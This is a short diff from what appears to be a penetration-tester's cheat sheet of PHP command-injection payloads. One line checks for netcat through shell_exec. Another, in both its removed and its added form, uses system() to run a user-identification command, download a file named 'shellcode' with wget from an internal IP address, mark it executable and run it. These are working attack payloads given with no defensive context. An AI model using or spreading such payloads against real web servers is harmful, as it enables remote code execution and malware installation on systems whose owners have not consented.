@@ -154,4 +154,4 @@ Check if netcat present:
 '<?php echo shell_exec("nc -v");exit;?>'
 
 get shellcode and execute :
-<?php system("id; wget 192.168.44.44/shellcode; chmod 755 shellcode;./shellcode;");?>
+'<?php system("whoami; wget 192.168.44.44/shellcode; chmod 755 shellcode;./shellcode")?>'
